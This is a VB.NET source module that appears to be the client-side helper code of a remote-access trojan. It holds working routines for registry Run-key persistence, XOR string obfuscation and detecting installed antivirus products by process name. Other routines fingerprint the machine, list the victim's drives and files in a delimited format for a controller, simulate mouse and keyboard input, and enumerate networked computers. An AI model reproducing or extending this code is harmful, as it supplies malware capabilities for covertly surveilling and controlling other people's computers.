Imports System.IO
Imports System.IO.Compression
Imports System.Runtime.InteropServices

Module Func
    <DllImport("shell32.dll")>
    Private Function SHGetFileInfo(pszPath As String, dwFileAttributes As UInteger, ByRef psfi As SHFILEINFO, cbSizeFileInfo As UInteger, uFlags As UInteger) As IntPtr
    End Function

    Structure SHFILEINFO
        Public hIcon As IntPtr
        Public iIcon As Integer
        Public dwAttributes As Integer
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=260)>
        Public szDisplayName As String
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=80)>
        Public szTypeName As String
    End Structure

    Const SHGFI_ICON As UInteger = &H100
    Const SHGFI_LARGEICON As UInteger = &H0 ' 32x32 pixels
    Const SHGFI_SMALLICON As UInteger = &H1 ' 16x16 pixels

    Public Sub SelfDel() ''Delete Lavender

    End Sub

    Public Function Xord(ByVal str As String, ByVal key As String)
        Dim i As Short
        Xord = ""
        Dim KeyChar As Integer
        KeyChar = Asc(key)
        For i = 1 To Len(str)
            Xord &=
               Chr(KeyChar Xor
               Asc(Mid(str, i, 1)))
        Next
    End Function

    Public Sub AddS(ByVal b As Boolean, ByVal sk As String)
        Try
            Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
            regKey.SetValue(sk, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
        Catch : End Try
    End Sub
    ''==========================================================================
    <DllImport("user32.dll")>
    Public Sub mouse_event(dwFlags As UInteger, dx As UInteger, dy As UInteger, dwData As UInteger, dwExtraInfo As Integer)
    End Sub
    <DllImport("user32.dll")>
    Function keybd_event(bVk As Byte, bScan As Byte, dwFlags As UInteger, dwExtraInfo As UIntPtr) As Boolean
    End Function
    Function SB(ByVal s As String) As Byte() ' string to byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function BS(ByVal b As Byte()) As String ' byte() to string
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Public GetProcesses() As Process

    Public Function ZIP(ByVal B() As Byte, ByRef CM As Boolean) As Byte()
        ' compress Bytes With GZIP
        If CM = True Then
            Dim M As Object = New IO.MemoryStream()
            Dim gZip As Object = New IO.Compression.GZipStream(M, CompressionMode.Compress, True)
            gZip.Write(B, 0, B.Length)
            gZip.Dispose()
            M.Position = 0
            Dim BF(M.Length) As Byte
            M.Read(BF, 0, BF.Length)
            M.Dispose()
            Return BF
        Else
            Dim M As Object = New IO.MemoryStream(B)
            Dim gZip As Object = New GZipStream(M, CompressionMode.Decompress)
            Dim buffer(3) As Byte
            M.Position = M.Length - 5
            M.Read(buffer, 0, 4)
            Dim size As Integer = BitConverter.ToInt32(buffer, 0)
            M.Position = 0
            Dim BF(size - 1) As Byte
            gZip.Read(BF, 0, size)
            gZip.Dispose()
            M.Dispose()
            Return BF
        End If
    End Function

    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function

    Function getanti()
        Dim antivirus As String
        Dim total As String = "Not Found"
        'get name anti-virus vb.net function
        Dim procList() As Process = Process.GetProcesses()

        Dim i As Integer
        For i = 0 To procList.Length - 1 Step i + 1
            Dim strProcName As String = procList(i).ProcessName.ToLower
            If strProcName = "ekrn" Then
                antivirus = "NOD32"
            ElseIf strProcName = "avgcc" Then
                antivirus = "AVG"
            ElseIf strProcName = "avgnt" Then
                antivirus = "Avira"
            ElseIf strProcName = "ahnsd" Then
                antivirus = "AhnLab-V3"
            ElseIf strProcName = "bdss" Then
                antivirus = "BitDefender"
            ElseIf strProcName = "bdv" Then
                antivirus = "ByteHero"
            ElseIf strProcName = "clamav" Then
                antivirus = "ClamAV"
            ElseIf strProcName = "fpavserver" Then
                antivirus = "F-Prot"
            ElseIf strProcName = "fssm32" Then
                antivirus = "F-Secure"
            ElseIf strProcName = "avkcl" Then
                antivirus = "GData"
            ElseIf strProcName = "engface" Then
                antivirus = "Jiangmin"
            ElseIf strProcName = "avp" Then
                antivirus = "Kaspersky"
            ElseIf strProcName = "updaterui" Then
                antivirus = "McAfee"
            ElseIf strProcName = "msmpeng" Then
                antivirus = "MSE/Defender"
            ElseIf strProcName = "zanda" Then
                antivirus = "Norman"
            ElseIf strProcName = "npupdate" Then
                antivirus = "nProtect"
            ElseIf strProcName = "inicio" Then
                antivirus = "Panda"
            ElseIf strProcName = "sagui" Then
                antivirus = "Prevx"
            ElseIf strProcName = "Norman" Then
                antivirus = "Sophos"
            ElseIf strProcName = "savservice" Then
                antivirus = "Sophos"
            ElseIf strProcName = "saswinlo" Then
                antivirus = "SUPERAntiSpyware"
            ElseIf strProcName = "spbbcsvc" Then
                antivirus = "Symantec"
            ElseIf strProcName = "thd32" Then
                antivirus = "TheHacker"
            ElseIf strProcName = "ufseagnt" Then
                antivirus = "TrendMicro"
            ElseIf strProcName = "dllhook" Then
                antivirus = "VBA32"
            ElseIf strProcName = "sbamtray" Then
                antivirus = "VIPRE"
            ElseIf strProcName = "vrmonsvc" Then
                antivirus = "ViRobot"
            ElseIf strProcName = "vbcalrt" Then
                antivirus = "VirusBuster"
            ElseIf strProcName = "mbam" Then
                antivirus = "Malwarebytes Anti-Malware GUI"
            ElseIf strProcName = "mbamresearch" Then
                antivirus = "Malwarebytes Anti-Malware"
            ElseIf strProcName = "mbamservice" Then
                antivirus = "Malwarebytes Anti-Malware Service"
            Else
                antivirus = "NA"
            End If

            If Not antivirus = "NA" Then
                If total = "Not Found" Then
                    total = ""
                Else
                    total += ", "
                End If
                total += antivirus
            End If
            Dim iProcID As Integer = procList(i).Id ''PID antivi proc
        Next

        Return total
    End Function
    Public Function getDrives() As String
        Dim allDrives As String = ""
        For Each d As DriveInfo In My.Computer.FileSystem.Drives
            Select Case d.DriveType
                Case 3
                    allDrives += "[Drive]" & d.Name & "^||^^||^x^||^"
                Case 5
                    allDrives += "[CD]" & d.Name & "^||^^||^x^||^"
                Case 2
                    allDrives += "[Rem]" & d.Name & "^||^^||^x^||^"
            End Select
        Next
        Return allDrives
    End Function
    Public Function readtext(ByVal l As String) As String
        Return IO.File.ReadAllText(l)
    End Function
    Public Function getFolders(ByVal location) As String
        Dim di As New DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "^||^^||^x^||^"
        Next
        Return folders
    End Function
    Public Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "^||^" & f.Length.ToString & "^||^"
            Try
                files += Convert.ToBase64String(IconToBytes(Icon.ExtractAssociatedIcon(f.FullName))) & "^||^"
                ''files += Convert.ToBase64String(IconToBytes(IconTools.GetIconForExtension(Path.GetExtension(f.FullName), ShellIconSize.LargeIcon))) & "^||^"
            Catch ex As Exception
                files += "x^||^"
            End Try
        Next
        Return files
    End Function
    Public Function getlog(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.log*")
            files += f.Name & "|"
        Next
        Return files
    End Function

    Function IconToBytes(icon As Icon) As Byte()
        Using ms As New MemoryStream()
            icon.ToBitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png)
            Return ms.ToArray()
        End Using
    End Function

    Private is64BitProcess As Boolean = (IntPtr.Size = 8)
    Public is64BitOperatingSystem As Boolean = is64BitProcess OrElse InternalCheckIsWow64()

    <DllImport("Kernel32.dll", SetLastError:=True, CallingConvention:=CallingConvention.Winapi)>
    Public Function IsWow64Process(
    ByVal hProcess As IntPtr,
    ByRef wow64Process As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean

    End Function

    Public Function InternalCheckIsWow64() As Boolean
        If (Environment.OSVersion.Version.Major = 5 AndAlso Environment.OSVersion.Version.Minor >= 1) OrElse Environment.OSVersion.Version.Major >= 6 Then
            Using p As Process = Process.GetCurrentProcess()
                Dim retVal As Boolean
                If Not IsWow64Process(p.Handle, retVal) Then
                    Return False
                End If
                Return retVal
            End Using
        Else
            Return False
        End If
    End Function

#Region "Net Scan"
    Public Declare Unicode Function NetServerEnum Lib "Netapi32.dll" (
        ByVal Servername As Integer, ByVal Level As Integer, ByRef Buffer As Integer, ByVal PrefMaxLen As Integer,
        ByRef EntriesRead As Integer, ByRef TotalEntries As Integer, ByVal ServerType As Integer,
        ByVal DomainName As String, ByRef ResumeHandle As Integer) As Integer

    Public Structure SERVER_INFO_101
        Public Platform_ID As Integer
        <MarshalAsAttribute(UnmanagedType.LPWStr)> Public Name As String
        Public Version_Major As Integer
        Public Version_Minor As Integer
        Public Type As Integer
        <MarshalAsAttribute(UnmanagedType.LPWStr)> Public Comment As String
    End Structure

    Public Declare Function NetApiBufferFree Lib "Netapi32.dll" (ByVal lpBuffer As Integer) As Integer

    Public Function GetNetworkComputers(Optional ByVal DomainName As String = Nothing) As List(Of String)
        Dim level As Integer = 101
        Dim MaxLenPref As Integer = -1
        Dim ResumeHandle As Integer = 0
        Dim ServerInfo As SERVER_INFO_101
        Dim SV_TYPE_ALL As Integer = &HFFFFFFFF
        Dim ret, EntriesRead, TotalEntries, BufPtr, CurPtr As Integer
        Dim ReturnList As New List(Of String)

        Try
            ret = NetServerEnum(0, level, BufPtr, MaxLenPref, EntriesRead, TotalEntries, SV_TYPE_ALL, DomainName, ResumeHandle)
            If ret = 0 Then
                CurPtr = BufPtr
                For i As Integer = 0 To EntriesRead - 1
                    ServerInfo = CType(Marshal.PtrToStructure(New IntPtr(CurPtr), GetType(SERVER_INFO_101)), SERVER_INFO_101)
                    CurPtr = CurPtr + Len(ServerInfo)
                    ReturnList.Add(ServerInfo.Name)
                Next
            End If
            NetApiBufferFree(BufPtr)
        Catch ex As Exception
        End Try

        Return ReturnList
    End Function

    ''---------------------------------------------
    Public Class NetApi32

        Private Declare Function NetApiBufferFree Lib "netapi32" (ByVal BufPtr As IntPtr) As Integer

        Private Declare Unicode Function NetServerEnum Lib "netapi32" _
             (ByVal Servername As IntPtr,
             ByVal Level As Integer,
             ByRef bufptr As IntPtr,
             ByVal PrefMaxLen As Integer,
             ByRef entriesread As Integer,
             ByRef TotalEntries As Integer,
             ByVal serverType As Integer,
             ByVal Domain As IntPtr,
             ByVal ResumeHandle As Integer) As Integer

        Public Structure SERVER_INFO_101
            Public Platform_ID As Integer
            <MarshalAsAttribute(UnmanagedType.LPWStr)> Public Name As String
            Public Version_Major As Integer
            Public Version_Minor As Integer
            Public Type As Integer
            <MarshalAsAttribute(UnmanagedType.LPWStr)> Public Comment As String
        End Structure

        Private Declare Function lstrlenW Lib "kernel32" (ByVal lpString As Integer) As Integer

        'Windows type used to call the Net API
        Private Const MAX_PREFERRED_LENGTH As Integer = -1
        Private Const NERR_SUCCESS As Integer = 0
        Private Const ERROR_MORE_DATA As Integer = 234
        Private Const SV_TYPE_WORKSTATION As Integer = &H1S
        Private Const SV_TYPE_SERVER As Integer = &H2S
        Private Const SV_TYPE_SQLSERVER As Integer = &H4S
        Private Const SV_TYPE_DOMAIN_CTRL As Integer = &H8S
        Private Const SV_TYPE_DOMAIN_BAKCTRL As Integer = &H10S
        Private Const SV_TYPE_TIME_SOURCE As Integer = &H20S
        Private Const SV_TYPE_AFP As Integer = &H40S
        Private Const SV_TYPE_NOVELL As Integer = &H80S
        Private Const SV_TYPE_DOMAIN_MEMBER As Integer = &H100S
        Private Const SV_TYPE_PRINTQ_SERVER As Integer = &H200S
        Private Const SV_TYPE_DIALIN_SERVER As Integer = &H400S
        Private Const SV_TYPE_XENIX_SERVER As Integer = &H800S
        Private Const SV_TYPE_SERVER_UNIX As Integer = SV_TYPE_XENIX_SERVER
        Private Const SV_TYPE_NT As Integer = &H1000S
        Private Const SV_TYPE_WFW As Integer = &H2000S
        Private Const SV_TYPE_SERVER_MFPN As Integer = &H4000S
        Private Const SV_TYPE_SERVER_NT As Integer = &H8000S
        Private Const SV_TYPE_POTENTIAL_BROWSER As Integer = &H10000
        Private Const SV_TYPE_BACKUP_BROWSER As Integer = &H20000
        Private Const SV_TYPE_MASTER_BROWSER As Integer = &H40000
        Private Const SV_TYPE_DOMAIN_MASTER As Integer = &H80000
        Private Const SV_TYPE_SERVER_OSF As Integer = &H100000
        Private Const SV_TYPE_SERVER_VMS As Integer = &H200000
        Private Const SV_TYPE_WINDOWS As Integer = &H400000  'Windows95 and above
        Private Const SV_TYPE_DFS As Integer = &H800000  'Root of a DFS tree
        Private Const SV_TYPE_CLUSTER_NT As Integer = &H1000000  'NT Cluster
        Private Const SV_TYPE_TERMINALSERVER As Integer = &H2000000  'TerminalServer
        Private Const SV_TYPE_DCE As Integer = &H10000000  'IBM DSS
        Private Const SV_TYPE_ALTERNATE_XPORT As Integer = &H20000000  'rtnalternate transport
        Private Const SV_TYPE_LOCAL_LIST_ONLY As Integer = &H40000000  'rtn localonly
        Private Const SV_TYPE_DOMAIN_ENUM As Integer = &H80000000
        Private Const SV_TYPE_ALL As Integer = &HFFFFFFFF
        Private Const SV_PLATFORM_ID_OS2 As Integer = 400
        Private Const SV_PLATFORM_ID_NT As Integer = 500

        'Mask applied to svX_version_major in
        'order to obtain the major version number.
        Private Const MAJOR_VERSION_MASK As Integer = &HFS

        <StructLayout(LayoutKind.Sequential)> Public Structure SERVER_INFO_100
            Dim sv100_platform_id As Integer
            Dim sv100_name As Integer
        End Structure

        Public Shared Function GetAllComputersInDomain() As List(Of String)
            Dim bufptr As IntPtr
            Dim dwEntriesread As Integer
            Dim dwTotalentries As Integer
            Dim dwResumehandle As Integer
            Dim se101 As SERVER_INFO_101 = New SERVER_INFO_101
            Dim success As Integer
            Dim nStructSize As Integer
            Dim cnt As Integer
            nStructSize = Marshal.SizeOf(se101)

            success = NetServerEnum(IntPtr.Zero, 101, bufptr, MAX_PREFERRED_LENGTH, dwEntriesread, dwTotalentries, SV_TYPE_NT, IntPtr.Zero, dwResumehandle)
            'if all goes well
            Dim resSC As New List(Of String)
            If success = NERR_SUCCESS And success <> ERROR_MORE_DATA Then
                'loop through the returned data, adding each
                'machine to the list
                For cnt = 0 To dwEntriesread - 1
                    'get one chunk of data and cast
                    'into an SERVER_INFO_100 struct
                    'in order to add the name to a list
                    se101 = DirectCast(Marshal.PtrToStructure(New IntPtr(bufptr.ToInt32 + (nStructSize * cnt)), GetType(SERVER_INFO_101)), SERVER_INFO_101)
                    resSC.Add(se101.Name)
                Next
            End If
            'clean up regardless of success
            Call NetApiBufferFree(bufptr)
            'return entries as sign of success
            Return resSC
        End Function
    End Class
#End Region
End Module
